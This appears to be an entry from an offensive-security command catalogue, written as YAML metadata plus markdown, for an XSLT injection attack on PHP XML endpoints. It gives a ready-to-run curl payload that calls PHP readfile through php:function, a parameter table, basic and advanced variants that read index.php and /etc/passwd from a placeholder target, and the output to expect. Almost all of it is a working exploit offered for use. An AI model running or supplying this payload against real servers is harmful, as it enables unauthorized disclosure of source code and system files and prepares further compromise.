---
id: 7ba64f01-20cb-4251-b78f-eb7fbda4e12d
name: inject-xslt-php-readfile
type: command
executor: curl
data: >-
  curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"
  encoding="UTF-8"?><html xsl:version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl"><body><xsl:value-of
  select="php:function('readfile','$_FILE_PATH')" /></body></html>'
  "$_TARGET_URL"
output: null
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Web
tags:
  - xslt-injection
  - rce
verified: true
validated: true
---

# Inject XSLT PHP Readfile

## Command

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><body><xsl:value-of select="php:function('readfile','$_FILE_PATH')" /></body></html>' "$_TARGET_URL"
```

## Description

This command sends a malicious XSLT payload via HTTP POST to a vulnerable XML processing endpoint, using the PHP readfile function to disclose the contents of a target file. It is used in the initial stages of XSLT injection exploitation to verify the vulnerability and extract sensitive files.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_FILE_PATH | Path to the file to read (e.g., 'index.php', '/etc/passwd') | Yes |
| $_TARGET_URL | URL of the vulnerable endpoint (e.g., 'http://target.com/process-xml') | Yes |
| -X POST | Specifies HTTP POST method | Built-in |
| -H "Content-Type: application/xml" | Sets the content type for XML payload | Built-in |
| -d '...' | The data payload containing the XSLT injection | Built-in |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><body><xsl:value-of select="php:function('readfile','index.php')" /></body></html>' "http://target.com/vuln"
```

### Advanced Usage

```bash
curl -X POST -H "Content-Type: application/xml" --data-urlencode '<?xml version="1.0" encoding="UTF-8"?><html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><body><xsl:value-of select="php:function('readfile','/etc/passwd')" /></body></html>' "http://target.com/vuln" -v
```

## Expected Output

The response body contains XML with the file contents as a text node within <body>, e.g.,

```xml
<?xml version="1.0" encoding="UTF-8"?><body>&lt;?php // file contents here ?&gt;</body>
```

If unsuccessful, expect HTTP 500 errors or empty responses indicating sanitization or parser restrictions.

## Related

- [[procedures/xslt-injection-for-php-remote-code-execution]]
- [[codes/xslt-php-readfile-payload]]
